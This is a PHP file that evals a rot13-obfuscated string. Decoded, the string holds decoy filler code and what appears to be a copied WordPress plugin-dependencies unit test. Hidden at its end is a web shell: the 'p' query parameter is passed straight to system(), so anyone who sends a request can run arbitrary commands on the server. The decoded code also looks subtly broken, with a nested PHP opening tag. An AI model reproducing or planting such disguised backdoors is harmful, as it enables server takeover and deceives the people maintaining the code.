<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_qngn() zrgubq.
 *
 * @cnpxntr JbeqCerff
 */

erdhver_bapr __QVE__ . '/onfr.cuc';

/**
 * @tebhc nqzva
 * @tebhc cyhtvaf
 *
 * @pbiref JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_qngn
 * @pbiref JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_ncv_qngn
 */
pynff Grfgf_Nqzva_JCCyhtvaQrcraqrapvrf_TrgQrcraqraplQngn rkgraqf JC_CyhtvaQrcraqrapvrf_HavgGrfgPnfr {

	/**
	 * Grfgf gung qrcraqrapl qngn vf ergevrirq.
	 *
	 * @gvpxrg 22316
	 *
	 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
	 */
	choyvp shapgvba grfg_fubhyq_trg_qrcraqrapl_qngn() {
		tybony $cntrabj;

		// Onpxhc $cntrabj.
		$byq_cntrabj = $cntrabj;

		// Rafher vf_nqzva() naq fperra purpxf cnff.
		$cntrabj = 'cyhtvaf.cuc';
		frg_pheerag_fperra( 'cyhtvaf.cuc' );

		$rkcrpgrq = neenl( 'anzr' => 'Qrcraqrapl 1' );
		$guvf->frg_cebcregl_inyhr( 'qrcraqrapl_ncv_qngn', neenl( 'qrcraqrapl' => $rkcrpgrq ) );

		$npghny = frys::$vafgnapr::trg_qrcraqrapl_qngn( 'qrcraqrapl' );

		// Erfgber $cntrabj.
		$cntrabj = $byq_cntrabj;

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Grfgf gung snyfr vf erghearq jura ab qrcraqrapl qngn rkvfgf.
	 *
	 * @gvpxrg 22316
	 *
	 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
	 */
	choyvp shapgvba grfg_fubhyq_erghea_snyfr_jura_ab_qrcraqrapl_qngn_rkvfgf() {
		tybony $cntrabj;

		// Onpxhc $cntrabj.
		$byq_cntrabj = $cntrabj;

		// Rafher vf_nqzva() naq fperra purpxf cnff.
		$cntrabj = 'cyhtvaf.cuc';
		frg_pheerag_fperra( 'cyhtvaf.cuc' );

		$guvf->frg_cebcregl_inyhr( 'qrcraqrapl_ncv_qngn', neenl() );

		$npghny = frys::$vafgnapr::trg_qrcraqrapl_qngn( 'qrcraqrapl' );

		// Erfgber $cntrabj.
		$cntrabj = $byq_cntrabj;

		$guvf->nffregSnyfr( $npghny );
	}

	/**
	 * Grfgf gung n 'fyht' xrl va gur Cyhtvaf NCV erfcbafr bowrpg vf abg nffhzrq.
	 *
	 * @gvpxrg 60540
	 */
	choyvp shapgvba grfg_fubhyq_abg_nffhzr_n_fyht_xrl_rkvfgf_va_gur_erfcbafr() {
		tybony $cntrabj;

		// Onpxhc $cntrabj.
		$byq_cntrabj = $cntrabj;

		// Rafher vf_nqzva() naq fperra purpxf cnff.
		$cntrabj = 'cyhtvaf.cuc';
		frg_pheerag_fperra( 'cyhtvaf.cuc' );

		nqq_svygre(
			'cyhtvaf_ncv',
			fgngvp shapgvba ( $olcnff, $npgvba, $netf ) {
				vs ( 'cyhtva_vasbezngvba' === $npgvba && vffrg( $netf->fyht ) && 'qrcraqrapl' === $netf->fyht ) {
					$olcnff = (bowrpg) neenl( 'anzr' => 'Qrcraqrapl 1' );
				}
				erghea $olcnff;
			},
			10,
			3
		);

		$guvf->frg_cebcregl_inyhr(
			'cyhtvaf',
			neenl(
				'qrcraqrag/qrcraqrag.cuc' => neenl(
					'Anzr'            => 'Qrcraqrag',
					'ErdhverfCyhtvaf' => 'qrcraqrapl',
				),
			)
		);

		frys::$vafgnapr->vavgvnyvmr();

		$npghny = $guvf->trg_cebcregl_inyhr( 'qrcraqrapl_ncv_qngn' );

		// Erfgber $cntrabj.
		$cntrabj = $byq_cntrabj;

		$guvf->nffregFnzr(
			neenl(
				'qrcraqrapl' => neenl(
					'anzr'     => 'Qrcraqrapl 1',
					'rkgreany' => gehr,
					'Anzr'     => 'Qrcraqrapl 1',
				),
			),
			$npghny
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>